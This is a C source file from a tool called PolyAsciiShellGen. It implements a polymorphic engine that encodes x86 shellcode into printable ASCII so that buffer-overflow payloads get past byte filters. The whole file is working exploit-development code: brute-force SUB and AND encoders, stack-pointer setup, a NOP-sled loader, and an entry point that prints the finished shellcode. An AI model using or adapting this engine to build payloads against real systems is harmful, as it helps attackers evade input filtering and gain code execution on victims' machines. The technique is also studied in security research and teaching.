//####################################################################
//############ Date: June 29 2015
//############ Author: Vincent Dary
//############ File: AsciiShellEngine.c
//############ Licence: GPLv3
//############ Description: Polymorphic Ascii Shellcode Engine
//############		    based on Riley "caezar" Eller technique.
//############		    Bypassing MSB Data Filters for Buffer
//############		    Overflow Exploits on Intel Platforms.
//####################################################################

#include "AsciiShellEngine.h"


// Performs the memory allocation of the futur ascii shellcode.
//
// parameters:
//		shellcodeSize: the size of original shellcode in numerical form
//		nopSleedLoadShell: the size of the sleed between the loader and the decoded shellcode
//		buffer: a pointer to allocate the buffer to store the ascii shellcode
//		size: the size of buffer allocated
//
// return: 0 in sucess or -1 in failure.
//
int ascii_shellcode_alloc(const size_t shellcodeSize, const unsigned int nopSleedLoadShell,
			   unsigned char **buffer, size_t *size)
{
	size_t allocSize        = 0;

	if(shellcodeSize == 0  ||  buffer == NULL)
		return 0;

	allocSize = ESP_INIT_SIZE
		  + EAX_ZERO_SIZE
		  + (SUB_SHELLCODE_TEMPLATE_SIZE * (shellcodeSize / 4));

	if(nopSleedLoadShell > 0)
	{
		allocSize += SUB_SHELLCODE_TEMPLATE_SIZE;

		if(nopSleedLoadShell > 1)
			allocSize += SUB_NOP_TEMPLATE_SIZE * (nopSleedLoadShell-1);
	}

	*buffer = mem_alloc(allocSize + 1, sizeof(unsigned char));
	if(*buffer == NULL)
		return -1;
	*size = allocSize + 1;

	return 0;
}


// Performs the encodage of the shellcode opcodes in ascii form with the Riley "caezar" Eller technique:
// Bypassing MSB Data Filters for Buffer Overflow Exploits on Intel Platforms.
// This is a incremental encoder with overflow.
//
// parameters:
//		start: four initial bytes to build the decoded shellcode
//		end: four decoded opcodes
//		opCodeAscii: an array of four word to store the substrate values to apply to the start value.
//			     The substrate values are in ascii form.
//
// return: return 0 on failure or the number of word to substrate to the start value to get the the four
//	   final opcodes. The opCodeAscii array contains a variable number of substrate values determined by
//	   the return code.
//
int sub_encoder(const chunk start, const chunk end, EncodedOpcode opCodeAscii)
{
        unsigned int sum, desired, overflow;
        int a, i, j, k, m, z, flag;
        unsigned char mem[CHR_SIZE+1];

        memset(mem, 0, 70);
        strncpy((char*)mem, CHR, CHR_SIZE);
        strfry((char*)mem);

        for(a = 1; a < 5; ++a)
        {
          overflow = flag = 0;
          for(z = 0; z < 4; z++)
          {
            for(i = 0; i < CHR_SIZE; i++)
            {
              for(j = 0; j < CHR_SIZE; j++)
              {
                for(k = 0; k < CHR_SIZE; k++)
                {
                  for(m = 0; m < CHR_SIZE; m++)
                  {
                        if(a < 2) j = CHR_SIZE + 1;
                        if(a < 3) k = CHR_SIZE + 1;
                        if(a < 4) m = CHR_SIZE + 1;
                        sum = end[z] + overflow + mem[i] + mem[j] + mem[k] + mem[m];
                        desired = (sum & 0x000000ff);
                        if(desired == start[z])
                        {
                                overflow = (sum & 0x0000ff00) >> 8;

				if(i < CHR_SIZE) opCodeAscii[0][z] = mem[i];
                                if(j < CHR_SIZE) opCodeAscii[1][z] = mem[j];
                                if(k < CHR_SIZE) opCodeAscii[2][z] = mem[k];
                                if(m < CHR_SIZE) opCodeAscii[3][z] = mem[m];

                                i = j = k = m = CHR_SIZE + 2;
                                ++flag;
                        }
                 }
               }
             }
           }
         }
         if(flag == 4)
		 return a;
      }
    return -1;
}


// This function find two values to AND with the eax egister in order to set to zero the register.
//
// parameter:
//		first: four bytes to AND with eax
//		second: four bytes to AND with eax
//
// note: ((eax AND B) AND C) == (eax AND (B AND C))
//
// return: 0 if the bytes was found or -1 in failure.
//
int and_eax_zero_encoder(chunk first, chunk second)
{
	size_t i, j, k, m;
        size_t b, c, flag;
	char mem[CHR_SIZE+1];

	memset(mem, 0, CHR_SIZE+1);
        strncpy((char*)mem, CHR, CHR_SIZE);
        strfry((char*)mem);

	for(i=0; i < CHR_SIZE; ++i)
        {
           for(j=0; j < CHR_SIZE; ++j)
           {
              for(k=0; k < CHR_SIZE; ++k)
              {
                for(m=0; m < CHR_SIZE; ++m)
                {
                        first[0] = mem[i];
                        first[1] = mem[j];
                        first[2] = mem[k];
                        first[3] = mem[m];

                        for(c=0; c < 4; c++)
                        {
                                flag = 0;
                                for(b=0; b < CHR_SIZE; ++b)
                                {
                                        if((first[c] & CHR[b]) == 0)
                                        {
                                                second[c] = CHR[b];
                                                b = CHR_SIZE;
                                                flag = 1;
                                        }
                                }
                                if(flag == 0)
                                        c = 4;
                                if(flag == 1 && c == 3)
                                	return 0;
			}
              }
	    }
	  }
	}
	return 0;
}


// Buils the first block of the ascii shellcode that sets the value of the stack pointer (esp) register.
//
// parameters:
//		buffer: a buffer to store the first block of the ascii shellcode
//		size: the sie of the buffer
//		espOffset: the offset to add or to substrate to the stack pointer (esp) register
//
// return: 0 if success to build the first block of the ascii shellcode or -1 in failure.
//
int build_esp_init(unsigned char *buffer, size_t size, int espOffset)
{
	chunk start, end;
	EncodedOpcode asciiOpcode;
	int subNb 	= 0;
	int i		= 0;
	size_t opIndex	= 0;


	if(buffer == NULL  ||  size < ESP_INIT_SIZE)
		return -1;

	memset(&start, 0, 4);
	memcpy(&end, &espOffset, 4);

	subNb = sub_encoder(start, end, asciiOpcode);

	if(subNb < 0)
	{
		printf("[-] %s : Sub encoder error\n", __FUNCTION__);
                return -1;
	}

	buffer[opIndex++] = 	PUSH_ESP;
	buffer[opIndex++] = 	POP_EAX;

	for(i = 0; i < subNb; ++i)
	{
		buffer[opIndex++] =     SUB_EAX_32;
		memcpy(buffer + opIndex,  asciiOpcode[i], 4);
		opIndex += 4;
	}

	buffer[opIndex++] = 	PUSH_EAX;
	buffer[opIndex] = 	POP_ESP;

	return 0;
}


// Builds the second block of the ascii shellcode that sets the eax register to zero.
//
// parameters:
//              buffer: a buffer to store the second block of the ascii shellcode
//              size: the size of the buffer
//
// return: 0 if success to build the first block of the ascii shellcode or -1 in failure.
//
int build_eax_zero(unsigned char *buffer, size_t size)
{
	chunk first, second;

	if(buffer == NULL  ||  size < EAX_ZERO_SIZE)
                return -1;

	if(and_eax_zero_encoder(first, second) < 0)
	{
		printf("[-] %s : and eax zero encoder error\n", __FUNCTION__);
		return -1;
	}

	buffer[0] =	AND_EAX_32; memcpy(buffer+1, first, 4);
	buffer[5] =	AND_EAX_32; memcpy(buffer+6, second, 4);

	return 0;
}


// Builds the ascii nop sleed constructor to sleed the eip register to the decoded shellcode.
//
// parameters:
//		nopSleedToShell: the size of the nopsleed to sleed the eip register to the decoded shellcode
//		eax: the value of the eax register when the the nop sleed constructor is executed
//              buffer: a buffer to store the ascii nop sleed constructor
//              size: the size of the buffer
//
// return: 0 if success to build the nop sleed constructor or -1 in failure.
//
int build_loader_to_shellcode(const unsigned int nopSleedToShell, const chunk eax,
                              unsigned char *buffer, size_t size)
{
	EncodedOpcode asciiOpcode;
        size_t packerIndex	= 0;
        chunk nopSleed          = {NOP, NOP, NOP, NOP};
        unsigned int i          = 0;
	int j			= 0;
	int subNb		= 0;

        if(buffer == NULL
	   || size < (SUB_SHELLCODE_TEMPLATE_SIZE + (nopSleedToShell - 1)))
                return -1;

        if(nopSleedToShell > 0)
        {
		subNb = sub_encoder(eax, nopSleed, asciiOpcode);
                if(subNb < 0)
                {
                        printf("[-] %s : Sub encoder error : opcodes not found\n", __FUNCTION__);
                        return -1;
                }

		for(j = 0; j < subNb; ++j)
		{
			buffer[packerIndex++] = SUB_EAX_32;
			memcpy(buffer + packerIndex, asciiOpcode[j], 4);
			packerIndex += 4;
		}

                if(nopSleedToShell >= 1)
                        for(i = 0; i < nopSleedToShell; ++i)
				buffer[packerIndex++] = PUSH_EAX;
        }

        return 0;
}


// Builds the ascii shellcode packer.
//
// parameter:
//		shellcode: an Shellcode structure that contains the original shellcode to pack
//		nopSleedToShell: the size of the nopsleed to sleed the eip register to the decoded shellcode
//              buffer: a buffer to store the ascii shellcode packer
//              size: the size of the buffer
//
// return: 0 if success to build the ascii shellcode packer or -1 in failure.
//
int build_shellcode_packer(const struct Shellcode *shellcode, const unsigned int nopSleedToShell,
			   unsigned char *buffer, size_t size)
{
	chunk start, end;
        EncodedOpcode asciiOpcode;
	size_t i 		= 0;
	int j                	= 0;
	int subNb		= 0;
	size_t chunkNb 		= 0;
	size_t packerIndex 	= 0;

	chunkNb = (shellcode->size / 4);

	if(shellcode == NULL  ||  buffer == NULL
	   || size < (chunkNb * SUB_SHELLCODE_TEMPLATE_SIZE)
	   || chunkNb  == 0)
			return -1;

	memset(&start, 0, 4);

	for(i = 0; i < chunkNb; ++i)
	{
	        memcpy(&end, (shellcode->mem + shellcode->size - (4 + (4 * i))), 4);
		subNb = sub_encoder(start, end, asciiOpcode);
	        if(subNb < 0)
		{
			printf("[-] %s : Sub encoder error : opcodes not found \n", __FUNCTION__);
	                return -1;
		}

		for(j = 0; j < subNb; ++j)
		{
			buffer[packerIndex++] = SUB_EAX_32;
			memcpy(buffer + packerIndex, asciiOpcode[j], 4);
			packerIndex += 4;
		}

		buffer[packerIndex++] = PUSH_EAX;
		memcpy(start, end, 4);
	}

	if(build_loader_to_shellcode(nopSleedToShell, start, buffer + strlen((char*)buffer),
							    size - strlen((char*)buffer)) < 0)
		return -1;

	return 0;
}


// The polymorphic ascii shellcode generator.
//
// parameters:
//		injection: an SmashStackArgs that contains the stack infoand the original shellcode
//		asciiShellcode: a pointer to an Shellcode structure to store the ascii shellcode
//
// return: 0 if the ascii shellcode is build or -1 on failure
//
int poly_ascii_shellcode_engine(const struct SmashStackArgs *injection, struct Shellcode *asciiShellcode)
{
	size_t chunkAdd = 0;

	if(injection == NULL || asciiShellcode == NULL)
		return -1;

	if(ascii_shellcode_alloc(injection->shellcode.size, injection->nopSleedToShell,
				  &asciiShellcode->mem, &asciiShellcode->size ) < 0)
		return -1;

	srand(time(NULL));

	if(build_esp_init(asciiShellcode->mem, asciiShellcode->size, injection->espOffset) < 0)
		return -1;

	chunkAdd = strlen((char*)asciiShellcode->mem);
	if(build_eax_zero(asciiShellcode->mem + chunkAdd, asciiShellcode->size - chunkAdd) < 0)
		return -1;

	chunkAdd = strlen((char*)asciiShellcode->mem);
	if(build_shellcode_packer(&injection->shellcode, injection->nopSleedToShell,
				  asciiShellcode->mem + chunkAdd, asciiShellcode->size - chunkAdd) < 0)
		return -1;

	return 0;
}


// The entry point of the PolyAsciiShellGen program.
//
// parameter:
//              argc: the argc argument from the main function
//              argv: the argv argument from the main function
//
// return: 0 in success or -1 in failure.
//
int poly_ascii_shellcode_entry(const int argc, const char *argv[])
{
	struct SmashStackArgs *injection = NULL;
	struct Shellcode asciiShell;

        if(cmd_ttmt(argc, (const char**)argv, &injection) < 0)
                return -1;

	if(poly_ascii_shellcode_engine(injection, &asciiShell) < 0)
		return -1;

	printf("%s\n", asciiShell.mem);

	free_smashstackargs(injection);
	if(asciiShell.mem != NULL)
		free(asciiShell.mem);

	return 0;
}
